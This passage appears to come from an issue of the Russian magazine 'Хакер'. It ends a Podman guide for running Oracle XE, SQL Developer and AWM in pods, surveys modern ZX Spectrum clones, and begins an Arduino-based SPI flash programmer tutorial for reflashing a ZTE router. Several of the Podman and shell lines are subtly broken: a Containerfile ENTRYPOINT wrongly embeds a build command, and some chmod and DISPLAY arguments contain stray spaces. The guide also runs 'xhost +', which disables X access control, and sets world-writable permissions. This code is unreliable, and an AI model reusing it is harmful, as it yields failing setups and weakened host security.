рами, указанными на схеме выше. Я буду приводить команды для пода
с номером 1.


СОЗДАЕМ КОНТЕЙНЕР ДЛЯ БАЗЫ ORACLE

В папке /colap/oracle создай файл Containerfile со следующим содер‐
жимым:


FROM gvenzl/oracle-xe:full
USER   oracle
RUN ["chmod", "u=rwx,g=rwx,o=rwx", "/opt/oracle"]
RUN ["chmod", "u=rwx,g=rwx,o=rwx", "/opt/oracle/oradata"]
ENTRYPOINT ["/bin/sh", "podman  build  --tag oracle:olap ./opt/
oracle/container-entrypoint.sh"]

Перейди в папку /colap/oracle и создай новый образ oracle:full:


cd /colap/oracle
podman  build  --tag oracle:full .

Точка в конце последней команды — это оператор, указывающий на текущий
каталог (а не конец предложения)!
   Давай протестируем созданный образ и инициализируем файлы баз дан‐
ных:



  # podman run -it --rm --name oracledb1 \
  -e ORACLE_PASSWORD=oracle -p 1521:1521 \
  -v /colap/pod1/oradata:/opt/oracle/oradata:z \
   oracle:full
  . . .
  The command completed successfully
  . . .
  Database mounted.
  Database opened.


Я сократил вывод, но, если у тебя появились такие же сообщения, можешь
остановить  контейнер  (Ctrl-C)  и  приступить  к  созданию  контейнера
oracledb1 для пода podolap1:


podman create -it --pod podolap1 --name oracledb1 \
 -e ORACLE_PASSWORD=oracle  \
 --volume  /colap/pod1/oradata:/opt/oracle/oradata:z \
 oracle:full


СОЗДАЕМ КОНТЕЙНЕР ДЛЯ SQL DEVELOPER

Чтобы создать контейнер для SQL Developer, достаточно выполнить такую
команду:


podman create -it --pod podolap1 \
 --name sqldev1 \
 -e DISPLAY= unix$DISPLAY \
 -v /tmp/.X11-unix:/tmp/.X11-unix \
 -v /colap/globaldb:/home/docky/globaldb:z \
 marcelhuberfoo/sqldeveloper:latest

Здесь на этапе создания контейнеров для пода можно остановиться. Если
тебе нужна только реляционная БД, в твоем распоряжении уже есть дос‐
таточно мощная СУБД Oracle и клиент для нее.


СОЗДАЕМ КОНТЕЙНЕР ДЛЯ AWM

Мы же, как и договаривались, будем ставить Analytic Workspace Manager.
Для контейнера используется образ harisekhon/centos-java:8, на который
устанавливается программа awm12.jar. Чтобы программа запускалась, нуж‐
но в каталоге /colap/awm/awm в файле awmrun.sh прописать путь к Java-
машине внутри используемого образа.
   Чтобы определить путь к Java VM, запусти контейнер на основе исходного
образа в тестовом режиме:


podman run -it --rm  \
 --name awmt \
harisekhon/centos-java:8 ./bin/sh

Для этого образа файл awmrun.sh должен иметь следующее содержимое:


chmod u= rwx,g= rwx,o=rwx /awm
JRE_ROOT=/usr/lib/jvm/java-1.8.0-openjdk
JAVA_RT=$JRE_ROOT/bin/java
$JAVA_RT -mx1024m -jar /awm/awm12.jar

Исполняемый файл AWM должен называться awm12.jar.
  Для создания образа oracle-awm:121 файл Containerfile в каталоге /
colap/awm должен иметь такое содержимое:


FROM harisekhon/centos-java:8
COPY ./awm /awm
ENTRYPOINT ["/bin/sh", "/awm/awmrun.sh"]

Перейди в папку /colap/awm и создай новый образ oracle-awm:121:


cd /colap/awm
podman  build  --tag oracle-awm:121 .

Создай контейнер awm1 для пода podolap1:


podman create --pod podolap1  \
 --name awm1 \
 -e DISPLAY= unix$DISPLAY \
 -v /tmp/.X11-unix:/tmp/.X11-unix:z \
oracle-awm:121

Процесс создания этого образа показан подробно, чтобы облегчить тебе
установку другой программы Oracle, если  потребуется. В то же время
готовый образ oracle-awm:121 можно загрузить с hub.docker.com такой
командой:


podman pull samhnn/oracle-awm:121


ЗАПУСКАЕМ ПОД

Поскольку SQL Developer и AWM имеют графический интерфейс, необходимо
разрешить доступ к графическому серверу:



  # xhost +
  access control disabled, clients can connect from any host


И наконец, запускаем под podolap1:


podman pod start podolap1

Должны появиться два окна: SQL Developer и AWM.





                Главное окно программ SQL Developer и AWM


ВЫВОДЫ

Получается, что контейнеры можно использовать для запуска программ
Oracle, а также других производителей ПО, доступ к которому ограничен.
   Используя механизм подов, легко организовать работу отдельных групп
пользователей на одном  компьютере.  Команды  создания  контейнеров
для пода можно изменить, как тебе нужно, и включить в скрипт podolap-
create.sh, чтобы значительно сократить время на создание очередного
пода.


             INFO

                          Глубже  погрузиться  в  затронутые темы  тебе
                       помогут книги Уолша Дэниэла «Podman в дей‐
                        ствии» и Шона Скотта «Oracle on Docker. Running
                         Oracle Databases in Linux Containers».
GEEK





Если  ты  наивно  полагаешь,  будто  ZX
Spectrum    навсегда   остался    где‑то
в далекой эпохе видеосалонов и жвачек
«Турбо», спешу тебя удивить: он живее всех
живых.  Современные  клоны  культового       Валентин Холмогоров                                                                               Ведущий редактор
компьютера  поражают   разнообразием:          valentin@holmogorov.ru
от минималистичных DIY-плат до глянцевых
ретрокомпов с HDMI, которые вызывают
у старых гиков флешбэки, а у молодых —
недоумение и легкую зависть. Погнали раз‐
бираться, на каких железках люди пытаются
запускать «Саботера» в 2025 году.


НАРОДНЫЙ КОМПЬЮТЕР

Все началось в 1982 году в Британии, где компьютеры были размером с Mini
Cooper, а стоили при этом как подержанный Aston Martin. Именно в тот пери‐
од сэр Клайв Синклер — талантливый инженер и предприниматель — решил,
что каждый британский подросток должен иметь свою собственную домаш‐
нюю персоналку. Причем такую, чтобы помещалась в рюкзак, позволяла прог‐
раммировать и запускать игры, а купить ее можно было, сэкономив на сэн‐
двичах в школьной столовой. Так на свет появился ZX Spectrum — черная
пластиковая коробочка с резиновой  клавиатурой, выводившая  картинку
на бытовой телевизор и с пронзительным писком загружавшая программы
с  обычного  кассетного  магнитофона.  Восьмибитный  процессор  Zilog
Z80 и 48 Кбайт оперативной памяти — в 1982 году это считалось довольно
продвинутой аппаратной конфигурацией.





                        Классический ZX Spectrum 48K

В СССР «Спектрумы» проникли в конце 80-х и сразу же сделались культовым
девайсом, предметом вожделения почти каждого советского школьника.
Оригинальный британский Speccy в Союз, конечно, не завозили: не барское
это дело — баловать граждан социалистической страны капиталистическими
чудесами. Но простая схемотехника компьютера и смекалка отечественных
инженеров творили чудеса: если нельзя купить, значит, надо спаять. В обща‐
ге, из купленной на радиорынке пригоршни микросхем, в элегантном кор‐
пусе, выпиленном лобзиком из найденного на ближайшей помойке куска
фанеры, и с клавиатурой из дверных звонков. Британская промышленность
смотрела бы на эти поделки с ужасом… если бы знала об их существовании.
   Началась эра «народных „Спектрумов“» — клонов, собранных вручную
на коленке, но с нежностью и любовью. Значительную роль в техническом
прогрессе советского спектрумостроения сыграл ленинградский инженер
Сергей Зонов, разработавший великолепную плату для ZX Spectrum под наз‐
ванием «Ленинград» и опубликовавший в свободном доступе принципиаль‐
ную схему компьютера. Именно на такой плате я собрал свой собственный
«Спектрум» в 1989 году, купив для него все необходимые комплектующие
на радиолюбительской толкучке.





   Мой личный «Композит» — клон ZX Spectrum 48K. Он даже работает!

Потом настала эпоха кооперативов и свободного предпринимательства: кло‐
ны «Спектрумов» начали массово выпускать вполне серьезные промыш‐
ленные предприятия. В свободной продаже появились все эти бесчисленные
«Дельты»,  «Профи»,  «Форумы»,  «Компаньоны»,  «Композиты»,  возникли
и  более   продвинутые   «Пентагоны»  со   «Скорпионами»,   оснащен‐
ные 128 и 256 Кбайт оперативки… Но объединяло этот разношерстный
зоопарк одно: в корпусах разных типов, форм, цветов и размеров прятался
все тот же компьютер с классической архитектурой Sinclair ZX Spectrum.
   Поразвлекавшись пару лет со «Спекки», я очень быстро перешел на плат‐
форму PC, но тоска по былым временам не давала мне покоя. Конечно, есть
эмуляторы, но они порой намного глючнее настоящего железа. Как выяс‐
нилось, в наши дни существуют полноценные модификации классического ZX
Spectrum — современные, на продвинутой элементной базе, но при этом
поддерживающие старые игрушки и софт. Вот самые известные среди них —
если ты тоже застал ту прекрасную эпоху, то сможешь запросто выбрать
что‑то подходящее и вспомнить былые времена.


ZX SPECTRUM НА БАЗЕ LUT216

Если ты увлекаешься DIY и мейкерством, то наверняка знаешь, что такое
LUT216. Это плата микроконтроллера, которая оптимизирована под исполь‐
зование LUT (Look-Up Table) — таблиц поиска, применяемых в программи‐
руемых логических интегральных схемах (FPGA). На LUT реализуют логику
аппаратных модулей, и потому эта плата часто используется в ретропроектах.





                     ZX Spectrum на базе LUT216

В нашей стране клоны ZX Spectrum 48 собирают на плате LUT216 с микросхе‐
мой БМК Т34BГ1, хотя вместо нее могли брать и другие чипы, например
CPLD EPM7032S. На плату устанавливается оригинальный процессор Z80
(либо его доступные в продаже аналоги), при этом компьютер имеет на борту
стандартные 48 Кбайт оперативной памяти, которые можно относительно
легко расширить до 128 с помощью дискретной логики или CPLD, что упро‐
щает конструкцию и повышает надежность. Компьютер с таким расширением
успешно проходит тесты и запускает игры, рассчитанные на 128 Кбайт
памяти, например Robocop.
   Перенос логики расширения памяти и управления на CPLD позволяет
уменьшить количество дискретных элементов на плате и повысить компак‐
тность устройства, однако требует тщательной отладки и корректной прошив‐
ки. Так, в версиях Spectrum LUT216 на базе EPM7032S со 128 Кбайт опе‐
ративки иногда наблюдаются фантомные повторные нажатия клавиш, осо‐
бенно если ты одновременно давишь комбинацию кнопок, что не проявля‐
ется в режиме 48K. Также компьютер иногда не стартует, показывая мусор
на экране при включении, и не реагирует на нажатие Reset.





              Еще один ZX Spectrum на базе LUT216

В общем, ZX Spectrum на LUT216 — это самый доступный современный аппа‐
ратный клон с расширенной памятью, выполненный на базе CPLD. Его можно
запихнуть в купленный на барахолке винтажный корпус и использовать
как обычный «Спекки»: никто и не заметит подмены. Видеосигнал RGB и про‐
вода загрузки программ c магнитофона при этом можно вывести на стандар‐
тные для «Спектрума» разъемы СГ-5.





                       LUT216 в ретрокорпусе

На известном сайте объявлений попадаются уже собранные и настроенные
LUT216 по цене 4,5–5 тысяч рублей за штуку, но примерно за эту же сумму
можно отыскать и оригинальный ZX Spectrum из 90-х, причем в работос‐
пособном состоянии. А можно сэкономить и попытаться собрать такой комп
самостоятельно, правда, придется повозиться с его прошивкой и настрой‐
кой. Впрочем, обсуждения реализации ZX Spectrum на LUT216  ведутся
на форумах  ретроэнтузиастов, например на ZX-PK.ru, где пользователи
делятся опытом, схемами и прошивками, а также помогают решать возника‐
ющие проблемы. Так что поддержку (как минимум моральную) ты совершенно
точно получишь.


ZX SPECTRUM NEXT

Когда обычный человек хочет поностальгировать, он открывает школьный
фотоальбом, надевает пыльный свитер с олимпийским мишкой или покупает
билет на «Дискотеку 80-х». А продвинутые пацаны и пацанессы пытаются раз‐
добыть ZX Spectrum Next — машину времени, замаскированную под мик‐
рокомпьютер.





                         ZX Spectrum Next

Это — еще одна попытка возродить «Спекки» на базе FPGA: компьютер аппа‐
ратно совместим с классическим ZX Spectrum, но при этом располагает
HDMI, Turbo-режимом и памятью объемом до 2 Мбайт. Все началось там, где
обычно реализуются амбициозные мечты стареющих гиков с инженерными
наклонностями, — на Kickstarter. Проект, стартовавший в 2017 году, вызвал
у публики такой ажиотаж, что по нему можно было измерять уровень ради‐
ации. Любители созерцать бегущие по экрану полосочки в процессе загрузки
с аудиокассеты ломанулись жертвовать деньги, как будто им пообещали вер‐
нуться в 1985-й и лично познакомить каждого с Марти Макфлаем. В итоге
было собрано 723 390 фунтов стерлингов вместо запланированных изна‐
чально 250 000, хотя организаторы стартапа потом клялись, что проект
не окупился.
   Результатом этого начинания стал довольно странный агрегат: формаль‐
но — ZX Spectrum, фактически — нечто новое, с обратной совместимостью,
которой позавидуют даже советские электропаяльники. Устройство исполь‐
зует FPGA-чип Xilinx Spartan-6 в первом выпуске и более мощный — в сле‐
дующем. Он имитирует все внутренности оригинального железа, но добав‐
ляет столько новых возможностей, что у Клайва Синклера случился бы эсте‐
тический шок.
   Корпус — настоящий ретрофетиш. Дизайнеры решили сделать не просто
копию Spectrum, но нечто новое в той же эстетике. На корпусе есть сов‐
ременный порт HDMI, ридер SD-карт для загрузки программ, а компьютер
второго поколения может похвастаться даже наличием Wi-Fi. Машина под‐
держивает стандартную для «Спекки» TR-DOS, CP/M, а также специально
написанную для нее операционную систему NextOS.





                            NextOS

Spectrum Next — это не просто ретрокомпьютер, это находка для тех, кто счи‐
тает, что будущее наступило слишком быстро и только в его детстве все было
настоящим. Поиграть в GTA на нем не выйдет, зато в Knight Lore — хоть каж‐
дый день, и даже без загрузки с кассеты, потому что тут есть SD-карта.
Компьютер дает совершенно однозначный ответ на вопрос: «А можно ли сов‐
местить ламповость с HDMI?» Можно. Но дорого. Сейчас ZX Spectrum Next
можно найти на площадках вроде eBay, а официальный магазин specnext.com
иногда устраивает аукционы и перепродажи. В наличии время от времени
появляются ограниченные партии, но чаще всего с задержками в поставках.


ZX UNO

Если бы в 80-е инженерам Sinclair сказали, что их легендарный компьютер
однажды уместится в коробчонку размером с банковскую карту, они, воз‐
можно, заподозрили бы тебя в колдовстве, работе на КГБ или, не дай бог,
в сотрудничестве с Commodore. Однако реальность оказалась куда безумнее
фантазий: в 2016 году испанские специалисты разработали ZX UNO —
еще один FPGA-клон «Спекки» на базе Xilinx Spartan XC6SLX9, который под‐
держивает множество моделей ZX Spectrum и расширений.





                             ZX UNO

ZX UNO, в отличие от своего пращура, не требует задумчивого ковыряния
отверткой в магнитофоне при загрузке с кассеты — софт считывается с SD-
карты. Компьютер разработали энтузиасты, которые не могли до конца опре‐
делиться: хотят они идеальную эмуляцию оригинального «Спекки» или что‑то
круче, поэтому сделали одновременно и то и другое. FPGA-ядро воспроизво‐
дит ZX Spectrum 48K, 128K и Plus2, поддерживаются эмуляции Pentagon
и даже радикальных франкенштейн‑сборок, которых никогда не существо‐
вало в природе. Вывод видео реализован через стандартный интерфейс VGA,
но есть и поддержка SCART, на случай если ты хранишь в шкафу ЭЛТ‑телеви‐
зор рядом с видеомагнитофоном VHS и набором «тех самых» видеокассет.
   Вместо родной «резиновой» клавиатуры можно подключить другую, сов‐
местимую с PS/2, еще на борту имеется модуль Wi-Fi (ESP8266), если тебе
вдруг захочется писать программы на BASIC и выкладывать их в Twitter.
  Все это хозяйство работает под управлением фирменного загрузчика
UNO Menu, который позволяет запускать приложения в форматах TAP, TZX,
SNA, TRD. Даже POKE можно прописать, если ты вдруг решил вспомнить
молодость и пройти Jet Set Willy на бессмертии. Вообще, FPGA позволяет
загружать разные ядра, поэтому на ZX UNO можно эмулировать и другие
аппаратные платформы. Хочешь Atari 2600? Пожалуйста. MSX? Легко. NES?
Почему бы и нет. Но самое главное: ZX UNO — это проект с открытыми
исходниками. Платы и комплекты доступны у энтузиастов и на специализиро‐
ванных форумах, а покупка возможна через сайты сообщества или рет‐
ромагазины. К сожалению, с оплатой всей этой радости из России (как и с
доставкой) в последнее время возникают определенные сложности.


ZX SPIDER 128

По паспорту ZX Spider 128 — это чистокровный «Спектрум», верный традици‐
ям Pentagon 128, но на деле это вполне современная машина, созданная
польским энтузиастом. Внутри — современная ПЛИС‑архитектура на FPGA,
видеовыход RGB, аудиопорты в форм‑факторе «мини‑джек» и даже поддер‐
жка внешней памяти через SD-карту. Загрузчик — с меню, в котором больше
пунктов, чем в современном холодильнике продуктов.





                           ZX Spider 128

На основе этой платы с кастомными прошивками российские энтузиасты
собирают практически готовые «Спектрумы», которые можно запихнуть как в
восстановленный ретрокорпус с классической «резиновой» клавиатурой, так
и в современную «коробку», напечатанную на 3D-принтере или вырезанную
из пластика на лазерном станке. Технически к этому компу можно подключить
и контроллер дисковода Beta Disk 128X, после чего он превращается в пол‐
ноценный клон довольно продвинутого «Пентагона» с TR-DOS на борту. Есть
ли у него SCART? Да. Можно ли подключить VGA? Можно. Будет ли он
работать с оригинальными геймпадами, как в девяностые, когда ты не знал,
что такое инпутлаг? Будет! А еще на нем можно запускать TRD-образы, смот‐
реть демки, и все это не на эмуляторе, а «по‑настоящему», на физической
железяке. Вот ведь кайф.
   Смонтированную, настроенную и готовую к работе плату «паучка» можно
найти на всем известной доске объявлений, на барахолках и специализиро‐
ванных форумах. Но, понятно, не за паучка: цена варьируется, обычно этот
компьютер продают примерно за 5 тысяч рублей.


ZX SPECTRUM HARLEQUIN

«Арлекин» — это аппаратный клон ZX Spectrum 48 и 128K, только без FPGA.
Существует несколько ревизий этой платы, но практически все они имеют
порты RS-232, а также обеспечивают поддержку внешних дисководов.
   Ирония заключается в том, что Harlequin начинался как... бессмысленный
эксперимент. Кое‑кто в укутанных туманом английских гаражах (а точнее —
инженеры‑любители Пол Фарроу и Ричард Рассел) однажды подумал: а что,
если мы возьмем оригинальный ZX Spectrum 48K и пересоберем его без мик‐
росхем ULA, которые в оригинальном «Спекки» отвечали за все — от генера‐
ции изображения до таймингов и стирки белья по пятницам? Вместо них
Harlequin скомпонован на дискретной логике, никакой FPGA-магии.





                       ZX Spectrum Harlequin

Самое интересное в том, что современный компьютер на Z80 без FPGA
работает, и, по слухам, работает офигенно. С этим клоном ты получаешь
«железный» ZX Spectrum, который не только не уступает оригиналу, но и
в чем‑то его превосходит. Например, можно воткнуть стабилизатор питания c
«Али», не опасаясь, что разъем кассетника сожжет соседнюю квартиру,
и даже добавить вывод видео через композит без шаманства с бубном
и «массой по соседнему пину».
   Платы и готовые сборки «Арлекина» продаются на специализированных
сайтах, но стоят совсем недешево — порядка 200 евро — и в Россию не пос‐
тавляются. Так что нам остается только любоваться на красивые картинки
с изображением этой удивительной машины и завистливо глотать слюну.


PROFI

Это отечественный клон «Спектрума» от компании Kit8Bit, на сайте которой
можно заказать чистую плату для самостоятельной сборки компа. «Профи»
представляет собой клон ZX Spectrum 128 с турбо‑режимом, расширенной
оперативной памятью,  дополнительными  видеорежимами и  поддержкой
CP/M. Как оказалось, на этом же сайте можно купить и другие наборы
для  сборки  «Спектрумов» в  различных  модификациях: от  классических
«Ленинграда» и «Пентагона» до более редкого Compact 256 Turbo с контрол‐
лером дисковода прямо на плате.





               Profi — платы для самостоятельной сборки «Спекки»

Минус  этого решения  очевиден:  Profi — не  полноценный  компьютер,
а заготовка в виде печатной платы, к которой придется докупать комплек‐
тующие и собирать все это самостоятельно. Но если ты умеешь держать
в руках не только стакан с портвейном пепси‑колой, но и паяльник, это вряд
ли тебя остановит.


ЗАЧЕМ ЭТО ВСЕ?

Ну, ты же не спрашиваешь, зачем люди варят пиво дома, шьют себе эль‐
фийские плащи c бисером или пишут статьи про железо 40-летней давности
в «Хакер», правда?
   Клоны ZX Spectrum — это способ жить в параллельной реальности, где
компьютеры не собирали данные о тебе, а ждали, пока ты введешь LOAD ""
и  послушаешь  священное  «пииииии‑бииип‑пшшшш»  перед  запуском
любимой игрушки.
   Ностальгия — это новая нефть. Кто‑то тратит деньги на NFT-котиков,
кто‑то — на коллекции винила, а настоящие гики собирают себе ZX Spectrum,
чтобы снова пройти Saboteur, поплакать над Jet Set Willy и, конечно, набрать
на резиновой клавиатуре 10 PRINT 'HELLO'; 20 GOTO 10.
GEEK





В этой статье мы изготовим программатор
микросхем 25-й серии из  клона Arduino
UNO,  рассчитаем  резистивный делитель
для  согласования  уровней  напряжения,
подключим к программатору трехвольтовый         Игорь Орещенков                                                                                                   r0bur@mail.ru
чип памяти, сделаем резервную копию его
содержимого и запишем новые данные.


Нас повсюду окружают электронные цифровые устройства. Многие телеви‐
зоры, автомагнитолы, мониторы, маршрутизаторы, материнские платы компь‐
ютеров и ноутбуков хранят свои управляющие программы в микросхемах
памяти SPI Flash. Иногда для ремонта или расширения функциональности
таких  устройств  требуется  перепрошивка. А может, ты  задумываешься
о надежном хранении небольших объемов ценной для тебя информации?
Тогда читай о том, как можно использовать для этой цели SPI Flash!


ВЕЩЬ В СЕБЕ

Однажды мне в руки попал SOHO-маршрутизатор Ethernet/Wi-Fi, который
на поверку оказался одним из брендированных вариантов ZTE H118N. Он
включался,  работал,  но  был  практически  бесполезен  без  контракта
с  интернет‑провайдером.  Настройки в веб‑интерфейсе  оказались  заб‐
локированными, сетевые службы — отключенными, а поиск в интернете
показал, что превратить его во что‑то более‑менее пригодное можно лишь
путем замены firmware — программного обеспечения, хранящегося в мик‐
росхеме постоянного запоминающего устройства. Изготовитель маршру‐
тизатора позаботился о том, чтобы пресечь программный способ замены
содержимого постоянной памяти. Но путь «перепрошивки» с помощью прог‐
рамматора остался открытым.


             INFO

                            Если ты думаешь, что против отвертки и паяль‐
                       ника бессильно любое электронное устройство,
                         то  спешу тебя  разочаровать. Некоторые  ком‐
                         поненты информационных систем финансового
                            сектора, например платежные терминалы и бан‐
                       коматы, помимо  программной защиты,  имеют
                      защиту физическую. При попытке вскрыть корпус
                         таких устройств хранящиеся в них данные могут
                      быть  безвозвратно утрачены из‑за отключения
                         поддерживающего электропитания или физичес‐
                        ки разрушится носитель информации, например
                       подачей  электрического  импульса  от  предус‐
                           мотрительно  установленной батарейки. В пос‐
                      леднем  случае возможны даже шумо‑дымовые
                      эффекты.


Продолжив изучать вопрос, я узнал, что на некоторые маршрутизаторы
подобного  класса  можно  установить  операционную  систему  OpenWrt
на основе Linux, значительно расширяющую их возможности. Заодно не без
интереса почитал на форумах дискуссии, посвященные восстановлению мар‐
шрутизаторов, «окирпиченных» (не подающих признаков жизни) неудачными
попытками такой установки. В особо тяжелых случаях эта процедура сводится
к загрузке «дампов» (образов firmware) с помощью программатора. К тому же
оказалось,  что  маршрутизаторы  разных  производителей,  построенные
на одной или  схожей  аппаратной  платформе,  могут  функционировать
под управлением программного обеспечения конкурентов. В общем, вся
информационная среда подталкивала к тому, чтобы провести над имеющим‐
ся у меня устройством смелые эксперименты.


ЧТО МЫ БУДЕМ ДЕЛАТЬ?

Увы, мои надежды получить компактное универсальное Linux-устройство раз‐
бились о суровую действительность. Сняв крышку корпуса, я увидел мик‐
ропроцессор RTL8676S, о котором очень мало технической информации
в свободном доступе, а интерес к нему со стороны сообщества OpenWrt про‐
порционален объему этой информации. Но почему бы не дать этому маршру‐
тизатору шанс, заменив его прошивку стандартной, использующейся на ана‐
логичных устройствах?





  Электронная плата маршрутизатора ZTE H118N с микросхемой ПЗУ
  Winbond 25Q128FVSG

У  края  платы  нетрудно заметить  8-выводную  микросхему  постоянного
запоминающего устройства W25Q128FVSG, вокруг которой будут развивать‐
ся дальнейшие события. Из спецификации мы можем узнать, что она пред‐
ставляет собой память, реализованную по технологии NOR Flash, доступ
к которой выполняется с помощью последовательного интерфейса SPI.
Информационная емкость микросхемы составляет 128 Мбит (16 Мбайт),
и работает она в диапазоне напряжения от 2,7 до 3,6 В.


        WWW

                         Спецификация       микросхемы      Winbond
                    25Q128FVSG доступна на сайте производителя.


Широко используемое для программирования подобных «микросхем 25-й
серии» приспособление — недорогой USB-программатор на конвертере
CH341A. Для внутрисхемного программирования (то есть без снятия мик‐
росхемы с  платы) он  комплектуется  специальным зажимом‑прищепкой,
который обхватывает микросхему памяти и обеспечивает необходимый кон‐
такт. В моем арсенале такого чудесного инструмента не оказалось, зато
нашелся клон Arduino UNO. Для него есть скетч frser-duino, превращающий
его в UNO-программатор, с которым умеет работать утилита flashrom.


             INFO

                       Как ты знаешь, Arduino — это проект по разработ‐
                        ке  «дружественных»  к  пользователю  наборов
                           электронных     компонентов,     спецификации
                       которых публикуются под открытой лицензией.
                    Одним из самых успешных изделий стала плата
                    UNO, на которой «центральный» микроконтроллер
                      ATMega328P, дополненный необходимой для фун‐
                            кционирования обвязкой и удобными контактны‐
                    ми   линейками,   оснащен   «соконтроллером»
                     ATMega8U2 (версии R1 и R2) или ATMega16U2
                           (версия R3), реализующим функцию конвертера
                          USB-serial,  что  упрощает  загрузку  программ
                        в  устройство.  Кстати,  программные  проекты
                       для Arduino и скомпилированный из них двоичный
                       код называют скетчами (sketch).
                              Благодаря открытой лицензии и большому чис‐
                        лу поклонников Arduino UNO другие производите‐
                       ли освоили выпуск аналогичных устройств, внося
                        в  оригинальную  схему  некоторые  изменения.
                   В частности, для снижения стоимости изделий
                        сопряжение USB-serial часто реализуется не уни‐
                          версальным   программируемым    «соконтрол‐
                        лером», а  специализированным интерфейсным
                      чипом CH340G.


Чтобы перепрограммировать наш подопытный  маршрутизатор,  придется
выполнить следующие шаги.
 1. Подготовить рабочую среду на персональном компьютере.
 2. Собрать в рабочей среде скетч frser-duino из исходных текстов.
 3. Записать скетч frser-duino в клон Arduino UNO — получится UNO-прог‐
   рамматор.
 4. Подключить микросхему SPI Flash к UNO-программатору.
 5. Записать firmware из файла образа в SPI Flash.


ПОДГОТОВКА РАБОЧЕЙ СРЕДЫ

Работу над программным обеспечением я выполнял в привычной мне среде
Bodhi Linux 4.5 64 бит, базирующейся на Ubuntu 16.04. Так что описанные
действия должны подойти для любых более‑менее современных дистрибути‐
вов Linux, производных от Ubuntu. Понадобится только установить следующие
пакеты:
 • build-essential —  средства  для  сборки  программного  обеспечения
   из исходных текстов;
 • arduino-core —  метапакет,  содержащий  кросс‑компилятор  gcc-avr
   для микроконтроллеров AVR и утилиту для их программирования avrdude;
 • flashrom — утилита для управления программаторами микросхем памяти.

Установка перечисленных инструментов из репозитория выполняется коман‐
дой


sudo apt install build-essential arduino-core flashrom

Подключение платы клона Arduino к рабочему компьютеру с помощью USB-
кабеля сопровождается созданием файла последовательного порта /dev/
ttyUSB0:



  crw-rw---- 1 root dialout 188,0 ... /dev/ttyUSB0


Для проверки работы можно воспользоваться следующей командой:


avrdude -c arduino -p atmega328p -P /dev/ttyUSB0 -b 115200

В этой команде параметр -c указывает тип программатора, -p (строчная бук‐
ва) — модель программируемого микроконтроллера, -P (прописная буква) —
файл последовательного порта программатора, -b — скорость информа‐
ционного обмена. На экране должна появиться следующая информация:



  avrdude: AVR device initialized and ready to accept instructions
  Reading | ### ... ## | 100% 0.00s
  avrdude: Device signature = 0x1e950f (probably m328p)
  avrdude: safemode: Fuses OK (E:00, H:00, L:00)
  avrdude done. Thank you.


Если вместо этого ты видишь строку



  avrdude: ser_open(): can't open device "/dev/ttyUSB0": permission denied


значит, у тебя нет прав на доступ к порту. Для их получения надо стать членом
группы dialout и повторно зайти в систему:


sudo usermod -aG dialout xakep && exit

Вместо xakep используй имя своего  пользователя. Проверить членство
в группах можешь командой groups.
   Получилось? Тогда перед тем, как двигаться дальше, сделай резервную
копию флеш‑памяти твоего клона Arduino с находящимися там сейчас скет‐
чем и загрузчиком:


avrdude -c arduino -p atmega328p -P /dev/ttyUSB0 -U flash:r:uno_
backup.hex:i

На экран снова будет выведено несколько информационных строк, а в
текущем  каталоге  появится файл uno_backup.hex, содержащий образ
флеш‑памяти в формате Intel HEX.


             INFO

                   В последней команде я не указал параметр, зада‐
                  ющий  скорость  обмена.  Программа  avrdude
                          использует значение 115200 для программатора
                         Arduino по умолчанию. Но если по какой‑то при‐
                       чине ты получил серию сообщений о неправиль‐
                      ной скорости обмена, вот таких:

                     avrdude: stk500_getsync() attempt 1
                     of 10: not in sync : resp= 0x9f

                         то попробуй вернуть этот параметр в команду.



СБОРКА СКЕТЧА ДЛЯ UNO-ПРОГРАММАТОРА

Чтобы превратить клон Arduino в UNO-программатор, надо записать в него
машинный код  скетча  frser-duino, который мы  прямо  сейчас соберем
из исходных текстов. Для получения исходников из интернет‑репозитория
можно выполнить следующие команды:


wget -O frser-duino.zip https://github.com/urjaman/frser-duino/
archive/refs/heads/master.zip
wget -O libfrser.zip https://github.com/urjaman/libfrser/archive/
refs/heads/master.zip

Дальнейшая  подготовка исходных  текстов  заключается в их  распаковке
из архивов:


unzip frser-duino.zip
cd frser-duino
unzip ../libfrser.zip
rmdir libfrser
mv libfrser_master libfrser

С точки зрения frser-duino, клон Arduino UNO с чипом CH340G представляет
собой устройство с FTDI, только максимальная скорость обмена данными
с ним составляет не 2 000 000, а всего 115 200 бит/c. Команды для сборки
скетча приведены в разделе VISduino файла README.md:


DFLAGS=-DFTDI make clean all
SERIAL_DEV=/dev/ttyUSB0 make program

Вторая команда не только компилирует исходные тексты, но и сразу записы‐
вает получившийся машинный код в устройство, подключенное к порту /dev/
ttyUSB0. Поэтому перед ее выполнением имеет смысл подключить клон
Arduino к USB-порту. Если ты этого не сделал, то можешь прошить скетч
из файла frser-duino.hex позже с помощью команды


avrdude -c arduino -p m328p -P /dev/ttyUSB0 -b 115200 -U flash:w:
frser-duino.hex

Эта команда очищает содержимое flash-памяти  устройства, записывает
в него машинный код и выполняет сверку. Все происходит за считаные секун‐
ды:



  avrdude: AVR device initialized and ready to accept instructions
  Reading | ###...## | 100% 0.00s
  ...
  avrdude: erasing chip
  ...
  avrdude: writing flash (1418 bytes):
  Writing | ###...## | 100% 0.25s
  ...
  avrdude: verifying flash memory against frser-duino.hex:
  Reading | ###...## | 100% 0.22s
  ...
  avrdude: 1418 bytes of flash verified
  avrdude: safemode: Fuses OK (E:00, H:00, L:00)
  avrdude done. Thank you.


Неужели у нас теперь есть UNO-программатор? Проверить это можно ути‐
литой flashrom:


flashrom -p serprog:dev=/dev/ttyUSB0:115200

На экран будут выведены сведения о самой утилите, о программаторе и о
микросхеме памяти:



  (1) flashrom v0.9.9-rc1-r1942 on Linux 4.4.262
  (2) flashrom is free software, get the source code
  at https://flashrom.org
  (3) Calibrating delay loop... OK.
  (4) serprog: Programmer name is "frser-duino"
  (5) serprog: requested mapping AT45CS1282 is incompatible: 0x1080000
  bytes at 0xfef80000.
  (6) No EEPROM/flash device found.
  (7) Note: flashrom can never write if the flash chip isn't found
  automatically.


Если ты видишь в 4-й строке имя программатора frser-duino, то тебя можно
поздравить! На остальные сообщения пока что не обращай внимания. В 6-й
и 7-й строках говорится о том, что не была обнаружена память для прог‐
раммирования. Это неудивительно, потому что мы пока что не подключили
к UNO-программатору микросхему SPI Flash. А странная запись о какой‑то
несовместимости в 5-й строке будет преследовать нас и дальше. Но, нас‐
колько я смог убедиться, на качестве работы UNO-программатора это никак
не сказывается.
   Если же вместо описанного ты увидел такое сообщение:



  ...
  Calibrating delay loop... OK
  Error: cannot synchronize protocol - check communications and reset
  device?
  Error: Programmer initialization failed


то, скорее всего, в твоем клоне Arduino отсутствует скетч frser-duino или он
